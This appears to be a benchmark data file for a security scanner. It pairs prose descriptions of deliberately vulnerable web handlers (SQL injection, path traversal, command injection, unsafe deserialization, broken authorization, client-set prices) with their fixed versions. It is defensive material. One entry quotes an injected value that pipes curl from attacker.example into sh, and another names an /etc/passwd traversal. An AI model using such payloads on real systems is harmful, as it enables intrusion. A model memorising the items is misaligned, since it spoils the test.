outcomes.architecture: Next.js 15/16 App Router route handler streaming a generated export off local disk
outcomes.why: The name search parameter is joined onto the export root with no normalisation or containment check, so ../ segments walk out of the tenant directory and the file contents are returned to the caller.

The caller supplies an export id, the file name comes from a row scoped to the caller's organization, it is reduced with path.basename, and the resolved path is verified to sit under the tenant directory before anything is read.

outcomes.architecture: Next.js 15/16 App Router route handler issuing a raw SQL statement through Drizzle
outcomes.why: sql.raw receives a template string with the account search parameter pasted inside quotes and the sort parameter pasted into the order by clause, so a quote in account ends the literal and the rest of the statement is attacker-controlled.

The statement uses Drizzle's sql template so the organization, account and limit values are bound as parameters, and the order by column and direction come from fixed SQL fragments chosen by an allowlist lookup that rejects anything unknown.

outcomes.architecture: Next.js 15/16 App Router client component uploading directly to a third-party warehouse API
outcomes.why: A warehouse service credential is read from a NEXT_PUBLIC_ variable inside a "use client" module, so Next.js inlines the literal value into the JavaScript chunk served to every visitor, who can then call the ingest API directly with full service scope.

The service key is read only in a server component, where it never reaches the bundle, and the client child receives a short-lived token minted for one dataset and the ingest:append scope instead of the credential itself.

outcomes.architecture: Next.js 15/16 "use server" module exporting two actions bound to the same settings form
outcomes.why: A server action is a POST endpoint reachable by anyone who can address it, and this one writes the profile row identified by a hidden userId field without ever reading the session cookie; removeAvatar in the same module resolves a session first, so the check was simply forgotten here.
Both exported actions resolve the session cookie first and return early without one, and the row to update is identified by session.userId rather than by a field from the form.

outcomes.architecture: Next.js 15/16 "use server" module saving a schema-generated settings form
outcomes.why: Every field of the posted FormData is turned into an object and spread into the update, so a caller who adds role, planTier or creditsCents to the request writes those columns; the action is a network endpoint, so the fields the UI happens to render are not a constraint.
The four expected fields are read individually, validated by a strict schema that rejects unknown keys, and assigned to named columns, so nothing a caller invents can reach the update.

outcomes.architecture: Next.js 15/16 "use server" module updating a record identified by a form field
outcomes.why: The action authenticates the caller and then updates the invoice named by the form's invoiceId with no tenant predicate, so any signed-in user can overwrite the internal notes of another organization's invoice by posting a different id.

The update also takes the invoice id from the form, but the where clause pairs it with the session's organization and the empty returning result is reported as not found, so a foreign id changes nothing and reveals nothing.

outcomes.architecture: Next.js 15/16 "use server" module performing a billing-level workspace change
outcomes.why: The action loads the caller's membership and even selects the role column, but never compares it: any member of the workspace, including a viewer, can change the plan and the seat limit and push the change to the payment provider.
The same billing change requires the membership role to be one of the two billing roles before the update runs, so being signed in and a member of the workspace is not by itself sufficient.

outcomes.architecture: Next.js 15/16 "use server" module creating an order and a payment intent from a posted form
outcomes.why: The order total is computed from a unit price and a quantity taken straight from the form, and the payment intent is created for that amount, so a caller can buy at a price they chose; the quantity is not bounded or checked against stock, and a negative value inverts the total.

Only the product id and the quantity come from the form; the quantity must be a positive integer within a fixed per-line cap and available in stock, and both the unit price and the currency are read from the product row, so the total is server-determined.

outcomes.architecture: Hand-rolled POST RPC route handler alongside the action modules, authenticating with the same cross-site session cookie
outcomes.why: This endpoint mutates state — renaming the workspace, removing a member, rotating an API key — on the strength of a session cookie that the module itself re-issues with sameSite none, and it accepts a plain form-encoded body with no origin or referer check and no synchroniser token, so a form on any page can drive it in a victim's browser. Next.js server actions do not have this exposure: the framework only accepts them as POST with its own action id and compares the Origin header against the request Host, rejecting a cross-site invocation before any handler code runs.

The same dispatcher rejects any request whose Origin is not one of the two known front ends and requires the x-mq-csrf header to equal the double-submit cookie under a constant-time comparison, so a cross-site page can neither set the header nor read the token.

outcomes.architecture: node:http server dispatching with a switch over `${request.method} ${url.pathname}`
outcomes.why: The derived-column formula arrives in the request body and is compiled into a vm.Script that is then run in the server's own context, so anyone who can reach the endpoint executes arbitrary JavaScript inside the reporting process.

The client sends a metric key rather than an expression; the projection is one of four functions defined in this module, an unknown key is rejected with the supported list, and nothing from the request is ever compiled or evaluated.

outcomes.architecture: node:http server dispatching with an if-chain over the method and a trailing-slash-normalised pathname
outcomes.why: The base64 snapshot posted by the client is decoded and handed to node-serialize's unserialize, which rebuilds and immediately invokes functions embedded in the payload, so a crafted snapshot runs code on the editor host.

The decoded snapshot goes through JSON.parse and then a field-by-field check that copies only draftId, title, body and revision under type, format and length constraints, so no type or callable from the payload is reconstructed.

outcomes.architecture: node:http server dispatching with a RegExp exec over url.pathname to capture the workspace id
outcomes.why: applyPatch walks every key of the request body and assigns straight onto the target with no reserved-key check, so a body containing __proto__ or constructor.prototype writes onto Object.prototype and changes object behaviour for the whole process.

The same recursive merge skips __proto__, constructor and prototype, creates intermediate nodes with Object.create(null) and tests membership with Object.hasOwn, so no key in the request body can reach Object.prototype.

outcomes.architecture: node:http server dispatching through a route-table object keyed by `${request.method} ${url.pathname}`
outcomes.why: The supplier-supplied document is parsed with entity substitution (noent) and external DTD loading (dtdload) enabled and no network restriction, so a DOCTYPE declaring a SYSTEM entity makes the importer read local files or fetch internal URLs and echo them back in the mapped invoice.
The same parser is configured with noent, dtdload, dtdattr and dtdvalid all off and nonet on, so a DOCTYPE in the uploaded document resolves nothing and no external reference is fetched.

outcomes.architecture: node:http server dispatching with RegExp.prototype.test against url.pathname and a split() for the slug
outcomes.why: The draft markup from the request body is passed to handlebars.compile, so the request supplies the template program rather than its data; a Handlebars template reaches JavaScript through helper and prototype paths and is rendered server-side.

The request only picks one of the three layouts that ship with the release; those are read from disk and compiled once at boot, and the subject, headline and intro from the request are passed as context, which Handlebars escapes.

outcomes.architecture: node:http server with a method guard and a switch over url.pathname, form-encoded body
outcomes.why: The reset token is two Math.random draws in base 36; Math.random is a non-cryptographic PRNG whose internal state is recoverable from a handful of observed outputs, so tokens issued to other accounts can be predicted inside the 30-minute window and used to take the account over.
The confirmation token is 32 bytes from crypto.randomBytes rendered base64url, and only its SHA-256 digest is stored, so the value is unguessable and a leak of the table does not yield working links.

outcomes.architecture: node:http server dispatching through an array route table matched with Array.prototype.find
outcomes.why: The session cookie is an MD5 digest of the user id, a process-local counter and the millisecond clock, all of which an attacker can enumerate or observe, so a valid session identifier can be reconstructed offline and replayed even though the cookie flags are correct.
The session identifier is 32 bytes of crypto.randomBytes as hex, derived from nothing about the account, the clock or a counter, so no observed session narrows the search for another.

outcomes.architecture: node:http server dispatching through an array route table of RegExp patterns tested against url.pathname
outcomes.why: The free-text term, status filter, sort column and limit taken from the query string are interpolated into the SQL text and the statement is executed with no bound parameters, so a quote in q or an expression in sort changes the query the database runs.

Every value from the query string is pushed onto the values array and referenced by a numbered placeholder, the sort column is resolved through a fixed map, the direction collapses to ASC or DESC and the limit is parsed and clamped, so the statement text does not vary with user input.

outcomes.architecture: node:http server dispatching with a RegExp exec over url.pathname to capture the asset id
outcomes.why: The sourceUrl field from the request body is interpolated into a command string that is run through child_process.exec, which spawns a shell, so $(...) or a semicolon in the value executes arbitrary commands on the media host; the surrounding double quotes do not stop substitution.

The path is built from the asset record's own id and extension, checked to stay inside the media root, and passed as one element of a fixed argv array to execFile, so no shell is involved and the request cannot contribute a command.

outcomes.architecture: node:http server dispatching with an if-chain comparing request.method and url.pathname
outcomes.why: The line totals, subtotal and shipping are computed from the unitPriceCents, quantity and shippingCents values the client posted, and that total is the amount authorised, so a shopper can set any price; quantity is also unbounded and never checked for being a positive integer.

Unit prices come from the product rows loaded by SKU, shipping is priced by the server-side table, and each quantity must be an integer between one and ten, so the request can only choose which article is ordered and how many.

outcomes.architecture: node:http server dispatching through a Map keyed by `${request.method} ${url.pathname}`
outcomes.why: The balance is read, compared in application code, and written back as a value computed in JavaScript with no transaction, no row lock and no idempotency key, so two concurrent withdrawals both pass the sufficiency check and the second UPDATE overwrites the first, paying out the balance twice. A static reading should be reported as needs_review rather than confirmed, because the interleaving cannot be observed without driving the endpoint concurrently.

The debit is a single conditional UPDATE carrying balance_cents >= $1 in its WHERE clause whose rowCount decides the outcome, it runs inside the transaction that queues the payout and writes the ledger entry, and a uniquely constrained request key makes a retried tap replay the original transfer instead of creating a second one.

outcomes.architecture: FastAPI APIRouter modules with async path operations, SQLAlchemy 2.0 Session injected through Depends(get_session), the authenticated subject through Depends(get_current_user), Pydantic v2 request and response models, and HTTPException for error responses
outcomes.why: Every other predicate in this report is a bound parameter, but the segment filter is formatted into the WHERE clause as a single-quoted literal and joined into the text() statement that session.execute runs, so a segment value containing a quote closes the literal and appends attacker-chosen SQL — including a UNION over other accounts' rows — to a statement that otherwise scopes to current_user.account_id.
outcomes.detectionRequires: A Python AST with taint from FastAPI Query parameters, tracking the f-string composition into the list joined inside sqlalchemy.text() and recognising session.execute(text(...)) as the query sink even though a params dict is also passed.

outcomes.why: The same optional filter is appended as a named bind parameter and its value is put into the params dict, so the only interpolated fragment is the grouping expression resolved through the fixed GROUP_EXPRESSIONS map behind a regex-validated query parameter, and no request text becomes statement text.

outcomes.architecture: FastAPI APIRouter modules with async path operations, SQLAlchemy 2.0 Session injected through Depends(get_session), the authenticated subject through Depends(get_current_user), Pydantic v2 request and response models, and HTTPException for error responses
outcomes.why: The two file paths are shlex.quote'd but the request body's preset and audio_bitrate are interpolated raw into the same command string, which is then handed to subprocess.run with shell=True; a preset of "medium; curl attacker.example | sh" runs as a second shell command with the service account's privileges.
outcomes.detectionRequires: The Python AST plus the subprocess.run shell=True keyword argument as a sink, and enough taint precision to see that the interpolated Pydantic body fields preset and audio_bitrate are not covered by the shlex.quote calls applied to the neighbouring path segments.

outcomes.why: The encoder is invoked with an argv list and shell=False, so no shell parses the arguments, and the only free-text body field is rejected unless it is in the ALLOWED_COLOURS set while the remaining fields are an int range and a Literal.

outcomes.architecture: FastAPI APIRouter modules with async path operations, SQLAlchemy 2.0 Session injected through Depends(get_session), the authenticated subject through Depends(get_current_user), Pydantic v2 request and response models, and HTTPException for error responses
outcomes.why: The filename path parameter is declared with the :path converter, so it may contain slashes, and it is joined onto the message's storage directory with no containment check before FileResponse streams the result; a request for ../../../../etc/passwd or a relative path into another tenant's prefix returns that file, and os.path.basename is applied only to the download name, not to the path that is opened.
outcomes.detectionRequires: The Python AST, the Starlette :path route converter to know the parameter can hold separators, os.path.join with a request-derived component as the composition, and FileResponse (or open) as the file-read sink, plus the absence of a resolve()/commonpath containment check on that path.

outcomes.why: The joined path is resolved and rejected with a 400 unless Path.is_relative_to shows it still sits inside the resolved base directory for that report run, so traversal segments cannot escape the run's own prefix.

outcomes.architecture: FastAPI APIRouter modules with async path operations, SQLAlchemy 2.0 Session injected through Depends(get_session), the authenticated subject through Depends(get_current_user), Pydantic v2 request and response models, and HTTPException for error responses
outcomes.why: The detail endpoint loads the order with session.get on the path parameter alone; current_user is injected and used by the list endpoint above but never reaches this query, so any authenticated caller can read another account's order, billing email and shipping address by substituting the id.
outcomes.detectionRequires: The Python AST, knowledge that Depends(get_current_user) marks the authenticated subject, and recognition that session.get(Model, path_param) is a primary-key read whose predicate cannot include an owner column — the check a JS-only engine cannot perform on this file at all.

outcomes.why: The detail endpoint selects on both the path parameter and Shipment.account_id == current_user.account_id, so another account's shipment resolves to None and is returned as a 404 rather than disclosed.

outcomes.architecture: FastAPI APIRouter modules with async path operations, SQLAlchemy 2.0 Session injected through Depends(get_session), the authenticated subject through Depends(get_current_user), Pydantic v2 request and response models, and HTTPException for error responses
outcomes.why: The uploaded file is parsed with yaml.load under yaml.Loader, which honours the python/object and python/object/apply constructors, so a crafted definition executes arbitrary Python during parsing; the size limit and the later isinstance and "steps" checks all run after the document has already been constructed.
outcomes.detectionRequires: The Python AST, a rule that treats yaml.load with any Loader other than SafeLoader (and pickle.loads) as a deserialization sink, and taint from the UploadFile.read() body to that call.

outcomes.why: The same upload flow parses with yaml.safe_load, which constructs only plain scalars, lists and dicts, and the result must then satisfy a Pydantic model before anything is persisted, so no object in the document can be instantiated by the parser.

outcomes.architecture: tRPC 11 routers in TypeScript composed with router({ ... }), publicProcedure and protectedProcedure, Zod input schemas, a Prisma client and the session on ctx, and TRPCError for failures — procedures are addressed by dotted procedure path rather than by HTTP method and path
outcomes.why: byId resolves the order from input.orderId alone; protectedProcedure establishes that a session exists but ctx.session.organizationId never reaches the query, so any signed-in user can read another tenant's order, billing e-mail and shipping address. The list and resendConfirmation procedures in the same router show the tenant scoping this one drops. Recorded with the tRPC procedure path instead of a route because the procedure is not bound to an HTTP path.

The same detail-drawer procedure shape, but the lookup is a findFirst keyed on both input.invoiceId and ctx.session.organizationId, so another tenant's invoice comes back null and the procedure throws NOT_FOUND.

outcomes.architecture: tRPC 11 routers in TypeScript composed with router({ ... }), publicProcedure and protectedProcedure, Zod input schemas, a Prisma client and the session on ctx, and TRPCError for failures — procedures are addressed by dotted procedure path rather than by HTTP method and path
outcomes.why: setRole is reachable by every member of the organization: the membership is correctly tenant-scoped, but nothing checks the caller's own role before writing the new one, so a viewer can call members.setRole against their own membership and become owner. The remove procedure directly below it performs exactly the owner/admin check that this one is missing. Recorded with the tRPC procedure path instead of a route because the procedure is not bound to an HTTP path.

The same role-writing mutation, but the caller's own assignment on that project is loaded first and the mutation throws FORBIDDEN unless that assignment is maintainer or lead, so an ordinary contributor cannot promote anyone.

outcomes.architecture: tRPC 11 routers in TypeScript composed with router({ ... }), publicProcedure and protectedProcedure, Zod input schemas, a Prisma client and the session on ctx, and TRPCError for failures — procedures are addressed by dotted procedure path rather than by HTTP method and path
outcomes.why: The input schema accepts an open record of arbitrary keys and the whole patch is spread into the Prisma update, so the caller chooses which user columns are written — role, plan and emailVerified are all readable on the neighbouring query and all writable here. Recorded with the tRPC procedure path instead of a route because the procedure is not bound to an HTTP path.
The same sparse autosave patch, but the input is a strict Zod object naming the four editable fields and each one is copied across individually, so no key the client invents can reach the update.

outcomes.architecture: tRPC 11 routers in TypeScript composed with router({ ... }), publicProcedure and protectedProcedure, Zod input schemas, a Prisma client and the session on ctx, and TRPCError for failures — procedures are addressed by dotted procedure path rather than by HTTP method and path
outcomes.why: The organization and date bounds are bound as positional parameters, but the optional channel filter is wrapped in single quotes and concatenated into the WHERE clause of a $queryRawUnsafe call, so a channel value containing a quote closes the literal and appends attacker-chosen SQL. The Zod string with a max length constrains the shape of the value, not its content.

The same $queryRawUnsafe breakdown, but the optional filter is pushed onto the values array and referenced as a positional placeholder, and the only interpolated fragment is a column name resolved through a fixed map, so no caller-supplied text becomes statement text.

outcomes.architecture: tRPC 11 routers in TypeScript composed with router({ ... }), publicProcedure and protectedProcedure, Zod input schemas, a Prisma client and the session on ctx, and TRPCError for failures — procedures are addressed by dotted procedure path rather than by HTTP method and path
outcomes.why: deregister is declared on publicProcedure while every sibling in the router is protectedProcedure, so an unauthenticated caller with a device id revokes that device's push token, deletes the row and clears its refresh tokens — signing a stranger's handset out. The Zod input is present and correct; validating that the id is a UUID says nothing about who is allowed to submit it. Recorded with the tRPC procedure path instead of a route because the procedure is not bound to an HTTP path.

The same sign-out mutation, including the same push-token revocation and refresh-token cleanup, but it runs on protectedProcedure and the row is loaded with ctx.session.userId in the where clause, so a caller can only revoke their own sessions.

outcomes.why: The subtotal is summed from the client-supplied unitPriceCents, and that subtotal becomes the order total and the amount handed to ctx.payments.charge. The catalog rows are already loaded a few lines above and carry the authoritative priceCents, but they are only consulted for availability, so a caller can post unitPriceCents: 1 and be charged a penny. Recorded with the tRPC procedure path instead of a route because the procedure is not bound to an HTTP path.

The input still carries the price the browser was showing, but the total is summed from the catalog's priceCents and the submitted figure is only compared against it so a stale basket is rejected with CONFLICT, so the charged amount is server-determined.
